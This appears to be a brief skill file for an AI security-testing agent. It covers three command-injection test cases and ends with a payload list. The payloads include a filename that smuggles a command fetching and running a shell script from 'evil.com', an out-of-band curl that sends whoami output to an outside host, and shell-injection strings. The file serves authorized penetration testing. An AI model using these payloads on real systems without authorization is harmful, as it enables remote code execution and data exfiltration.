# Command Injection Hunting Skill — 3 Test Cases

> Load when: command injection, OS command, shell injection.

## 262. Direct command injection (easy)
Test every parameter with: `; ls`, `| ls`, `` `ls` ``, `$(ls)`. Report any command execution.

## 263. Blind command injection (medium)
Send `; sleep 5`. Compare response times. Report confirmed blind injection.

## 264. Command injection via file upload (medium)
Upload file with name: `; curl http://evil.com/shell.sh | bash;.png`. If filename is used in commands, report RCE.

---

## Command Injection Payloads
```
; ls
| ls
`ls`
$(ls)
&& ls
|| ls
; sleep 5
| nslookup yourdomain.com
; curl http://yourdomain.com/$(whoami)
```
